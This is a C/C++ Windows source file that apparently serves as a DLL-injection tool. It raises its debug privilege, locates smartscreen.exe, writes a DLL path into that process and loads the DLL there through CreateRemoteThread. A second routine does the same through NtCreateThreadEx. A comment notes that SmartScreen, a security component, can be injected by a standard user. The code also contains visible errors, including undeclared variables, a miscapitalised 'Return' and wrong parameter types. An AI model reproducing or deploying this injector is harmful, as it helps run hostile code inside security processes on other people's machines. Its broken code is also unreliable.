
/*
	Copyrights © Numéro du projet sept sérine.
	author: sérine
	
	THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
	ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
	TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
	PARTICULAR PURPOSE.
*/

#pragma once

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <WtsApi32.h>
#include <Winternl.h>
#include <cstdio>
#include <tlhelp32.h>
#include <comdef.h>
#include <psapi.h>
#include <Winternl.h>
#include <Wtsapi32.h>                                                                                          
#include <stdlib.h>

#ifdef _DEBUG 
#undef free
#define free(p) _free_dbg(p, _NORMAL_BLOCK); *(int*)&p = 0x666;
#endif

#ifndef _DEBUG_ONE
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "opengl32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib,"Wtsapi32.lib")
#pragma comment(lib,"RpcRT4.lib")
#endif

#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#endif
#endif
#include <stdint.h>

typedef int(*FUNKY_POINTER)(void);

#ifdef __cplusplus
#include <SDKDDKVer.h>
#endif

#define _WIN32_WINNT_WIN10_TH2 _WIN32_WINNT_WIN10
#define _WIN32_WINNT_WIN10_RS1 _WIN32_WINNT_WIN10

#ifdef _UNICODE
typedef wchar_t TCHAR;
#else
typedef char TCHAR;
#endif 
typedef const TCHAR* LPCTSTR;

#ifndef _WIN32_WINNT 
#define _WIN32_WINNT 0x0600     
#endif



typedef NTSTATUS(__stdcall *pNtCreateRemoteThreadEx)(
	_Out_ PHANDLE hThread,
	_In_ ACCESS_MASK desiredAccess,
	_In_ LPVOID ObjectAttributes,
	_In_ HANDLE pHandle,
	_In_ LPTHREAD_START_ROUTINE lStartRoutine,
	_In_ LPVOID lParam,
	_In_ BOOL cSuspend,
	_In_ ULONG StackZbits,
	_In_ ULONG SizeOfStackCommit,
	_In_ ULONG SizeOfStackReserved,
	_Out_ LPVOID BytesBuffer 
);

typedef struct NtCRTBuff {
	ULONG Unk;
	ULONG Unk1;
	ULONG Unk2;
	PULONG Unk3;
	ULONG Unk4;
	ULONG Unk5;
	ULONG Unk6;
	PULONG Unk7;
	ULONG Unk8;
} ;

UINT_PTR 
GetProcessBaseAddress(
	_In_ DWORD processID,
	_In_ HANDLE processHandle
)
{
	DWORD_PTR   baseAddress = 0;
	HMODULE     *moduleArray;
	LPBYTE      moduleArrayBytes;
	DWORD       bytesRequired;

	if (processHandle)
	{
		if (EnumProcessModulesEx(
			processHandle, NULL, 0,
			&bytesRequired, 0x02)
			)
		{
			if (bytesRequired)
			{
				moduleArrayBytes = (LPBYTE)LocalAlloc(
					LPTR, bytesRequired);

				if (moduleArrayBytes)
				{
					unsigned int moduleCount;

					moduleCount = bytesRequired / sizeof(HMODULE);
					moduleArray = (HMODULE *)moduleArrayBytes;

					if (EnumProcessModulesEx(
						processHandle, moduleArray,
						bytesRequired, &bytesRequired, 0x02)
						)
					{
						baseAddress = (DWORD_PTR)moduleArray[0];
					}
					LocalFree(moduleArrayBytes);
				}
			}
		}
	}

	return baseAddress;
}

//
// NOTE: We try to Adjust the Token Privileges
// SE_DEBUG_NAME but that's only required if you
// try to inject the dll into a protected/higher-Privileged
// image, if you just run the demo you dont need that & any standard
// user can perform the injection ( smartscreen is not a privileged image ).
//

BOOL
EnablePriv(
	_In_ LPWSTR SeName
)
{
	DWORD ReturnLength = 0;
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	DWORD address = 0x100579C;
	int value = 0;
	if (OpenProcessToken(
			GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
			&hToken)
		)
	{
		if (!LookupPrivilegeValue(
			NULL,
			SeName,
			&tkp.Privileges[0].Luid
		)) {
#ifdef DEBUG
			printf("%s",GetLastError());
#endif
			return FALSE;
		}
		else {
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(
				hToken,
				0,
				&tkp,
				sizeof(tkp),
				NULL,
				NULL)
				) 
			{
				return TRUE;
			}
			else {
#ifdef DEBUG
				printf("%s", GetLastError());
#endif
				return FALSE;
			}
		}
	}
	else {
#ifdef DEBUG
		printf("%s", GetLastError());
#endif
		return FALSE;
	}
	return FALSE;
}

DWORD 
GetProcessByName(
	_In_ TCHAR hProc
)
{
	HANDLE handle;
	PROCESSENTRY32 pEntry;
	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	do {
		if (!_wcsicmp(pEntry.szExeFile, hProc)) {
			DWORD luid = pEntry.th32ProcessID;
			CloseHandle(handle);
			return luid;
		}
	} while (Process32Next(handle,&pEntry));
	return 0;
}

BOOL
load(
	_In_ PCWSTR dll,
	_In_ DWORD luid
)
{
	DWORD dwSize = (lstrlenW(dll) + 1) * sizeof(wchar_t);
	HANDLE hProc = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE, luid
	);
	LPVOID pszlib = (PWSTR)
		VirtualAllocEx(
			hProc, NULL, dwSize,
			MEM_COMMIT, PAGE_READWRITE
		);
	auto h = WriteProcessMemory(
		hProc, pszlib, (PVOID)dll,
		dwSize, NULL
	);
	PTHREAD_START_ROUTINE tRet = (
		PTHREAD_START_ROUTINE)GetProcAddress(
			GetModuleHandle(TEXT("Kernel32")),
			"LoadLibraryW"
		);
	HANDLE hThread = CreateRemoteThread(
		hProc, NULL, 0,
		tRet, pszlib, 0, NULL
	);
	WaitForSingleObject(hThread, INFINITE);
	if (pszlib != NULL)
		VirtualFreeEx(hProc, pszlib, 0, MEM_RELEASE);
	if (hThread != NULL)
		CloseHandle(hThread);
	if (hProcess != NULL)
		CloseHandle(hProc);

	if (GetLastError()!=0){
		Return FALSE;
	}
	return TRUE;
}

BOOL
_CreateRemoteThread(
	_In_ LPWSTR lib,
	_In_ DWORD uid
) {
	HANDLE RemHandle = NULL;
	NtCRTBuff NTBuffer;
	LARGE_INTEGER Tmp, lTmp = { 0,};

	memset(&NTBuffer, 0, sizeof(NtCRTBuff));

	DWORD sizet = (lstrlenW(lib) + 1) * sizeof(wchar_t);
	HANDLE Handle;
	Handle = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE, uid
	);
	if (Handle == NULL) { return FALSE; }
	LPVOID remLib = (PWSTR)VirtualAllocEx(Handle, NULL, sizet,
		MEM_COMMIT,PAGE_READWRITE);
	if (remLib == NULL) { return FALSE; }
	WriteProcessMemory(
		Handle,
		remLib,
		(LPVOID)lib,
		sizet,
		NULL
	);
	PTHREAD_START_ROUTINE pStartRoutine = (
		PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T(
		"Kernel32.dll")),"LoadLibraryW");
	if (pStartRoutine == NULL) {
		return FALSE;
	}
	NTBuffer.Unk = sizeof(NtCRTBuff);
	NTBuffer.Unk1 = 0x10003;
	NTBuffer.Unk2 = 0x8;
	NTBuffer.Unk3 = (DWORD*)&Tmp;
	NTBuffer.Unk4 = 0;
	NTBuffer.Unk5 = 0x10004;
	NTBuffer.Unk6 = 4;
	NTBuffer.Unk7 = (DWORD*)&lTmp;
	NTBuffer.Unk8 = 0;

	pNtCreateRemoteThreadEx NtCreateThreadEx =
		(pNtCreateRemoteThreadEx)GetProcAddress(GetModuleHandle(
			TEXT("Ntdll.dll")), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL) {
		return FALSE;
	}
	NTSTATUS _Status = NtCreateThreadEx(
		&RemHandle,
		0x1FFFFF,
		NULL,
		Handle,
		pStartRoutine,
		(LPVOID)remLib,
		FALSE,
		NULL,
		NULL,
		NULL,
		&NTBuffer
	);
	WaitForSingleObject(RemHandle,INFINITE);
	if (remLib != NULL) {
		VirtualFreeEx(
			Handle,
			remLib,
			0,
			MEM_RELEASE
		);
	}
	if (RemHandle!=NULL) {
		CloseHandle(RemHandle);
	}
	if (Handle != NULL) {
		CloseHandle(Handle);
	}
	return TRUE;
}

VOID 
main(
	_In_ VOID
)
{
	HANDLE hProc = NULL;
	DWORD luid = NULL;
	TCHAR lPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, lPath);
	lstrcat(lPath, L"\\abs.dll");
	BOOL privEnabled = EnablePriv(
		SE_DEBUG_NAME
	);
	luid = GetProcessByName(
		L"smartscreen.exe"
	);
	if (luid == 0) {
#ifdef DEBUG
		printf("%s\n",GetLastError());
#endif
	}
	auto Ret = load(
		lPath,
		luid
	);
}




